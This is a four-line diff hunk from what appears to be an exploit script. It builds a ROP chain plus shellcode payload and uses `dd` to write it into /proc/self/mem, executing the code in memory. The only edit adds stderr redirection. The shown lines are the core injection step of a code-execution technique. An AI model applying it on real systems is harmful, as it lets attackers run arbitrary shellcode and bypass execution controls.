@@ -311,4 +311,4 @@ payload=$(echo -n $rop$sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
 printf $payload | (sleep .1; linux64 -R env -i $filename bs=$rop_len \
 count=1 of=/proc/self/mem seek=$write_to_addr conv=notrunc oflag=seek_bytes \
-iflag=fullblock)
+iflag=fullblock 2>&1)
